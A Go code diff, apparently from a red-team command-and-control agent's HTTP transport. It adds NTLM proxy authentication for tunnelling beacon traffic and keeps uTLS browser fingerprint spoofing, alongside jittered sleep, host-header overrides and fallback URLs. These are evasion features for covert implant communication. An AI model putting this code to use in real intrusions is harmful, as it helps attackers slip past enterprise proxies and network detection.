@@ -9,6 +9,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"net"
 	"net/http"
 	"net/url"
 	"strings"
@@ -115,10 +116,11 @@ type HTTPProfile struct {
 }
 
 // NewHTTPProfile creates a new HTTP profile.
-// proxyUser and proxyPass are optional proxy authentication credentials.
+// proxyUser, proxyPass, and proxyDomain are optional proxy authentication credentials.
+// If proxyDomain is set, NTLM authentication is used for the proxy (handles CONNECT + NTLM handshake).
+// If proxyDomain is empty and proxyUser is set, Basic auth is used (credentials embedded in proxy URL).
 // If proxyURL is empty, the system proxy is used (HTTP_PROXY/HTTPS_PROXY env vars).
-// If proxyURL contains embedded credentials (http://user:pass@host:port), those take precedence.
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, proxyUser, proxyPass, tlsVerify, tlsFingerprint, mtlsCertPEM, mtlsKeyPEM string, fallbackURLs, contentTypes []string, recoverySeconds int) *HTTPProfile {
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, proxyUser, proxyPass, proxyDomain, tlsVerify, tlsFingerprint, mtlsCertPEM, mtlsKeyPEM string, fallbackURLs, contentTypes []string, recoverySeconds int) *HTTPProfile {
 	profile := &HTTPProfile{
 		BaseURL:       baseURL,
 		UserAgent:     userAgent,
@@ -153,10 +155,24 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		IdleConnTimeout:     90 * time.Second,
 	}
 
-	// Configure proxy: explicit URL, or fall back to system proxy (env vars)
-	if proxyURL != "" {
+	// Configure proxy and TLS fingerprinting
+	useNTLMProxy := proxyURL != "" && proxyUser != "" && proxyDomain != ""
+
+	if useNTLMProxy {
+		// NTLM proxy: handle CONNECT + NTLM handshake + TLS ourselves.
+		// DialTLSContext covers HTTPS targets (CONNECT tunnel + TLS/uTLS).
+		// Proxy is set to nil since we handle the proxy connection directly.
+		proxyU, _ := url.Parse(proxyURL)
+		proxyAddr := proxyU.Host
+		if _, _, err := net.SplitHostPort(proxyAddr); err != nil {
+			proxyAddr = net.JoinHostPort(proxyAddr, "8080")
+		}
+		transport.DialTLSContext = ntlmProxyTLSDialer(proxyAddr, proxyDomain, proxyUser, proxyPass, tlsConfig, tlsFingerprint)
+		transport.TLSClientConfig = nil
+		transport.Proxy = nil
+	} else if proxyURL != "" {
+		// Standard proxy: Basic auth via URL credentials
 		if proxyU, err := url.Parse(proxyURL); err == nil {
-			// Inject credentials if provided separately and not already in URL
 			if proxyUser != "" && proxyU.User == nil {
 				if proxyPass != "" {
 					proxyU.User = url.UserPassword(proxyUser, proxyPass)
@@ -167,19 +183,19 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 			transport.Proxy = http.ProxyURL(proxyU)
 		}
 	} else {
-		// No explicit proxy — use system proxy (WinHTTP on Windows, env vars elsewhere)
 		transport.Proxy = systemProxyFunc()
 	}
 
-	// If a TLS fingerprint is specified (not "go" or empty), use uTLS to spoof
-	// the TLS ClientHello. This replaces Go's default TLS stack with uTLS for
-	// HTTPS connections, producing a browser-matching JA3 fingerprint.
-	if isRotateFingerprint(tlsFingerprint) {
-		transport.DialTLSContext = buildRotatingDialer(tlsConfig)
-		transport.TLSClientConfig = nil
-	} else if helloID, ok := tlsFingerprintID(tlsFingerprint); ok {
-		transport.DialTLSContext = buildUTLSTransportDialer(helloID, tlsConfig)
-		transport.TLSClientConfig = nil
+	// uTLS fingerprinting for non-NTLM-proxy connections.
+	// When using NTLM proxy, DialTLSContext already handles fingerprinting.
+	if !useNTLMProxy {
+		if isRotateFingerprint(tlsFingerprint) {
+			transport.DialTLSContext = buildRotatingDialer(tlsConfig)
+			transport.TLSClientConfig = nil
+		} else if helloID, ok := tlsFingerprintID(tlsFingerprint); ok {
+			transport.DialTLSContext = buildUTLSTransportDialer(helloID, tlsConfig)
+			transport.TLSClientConfig = nil
+		}
 	}
 
 	profile.client = &http.Client{
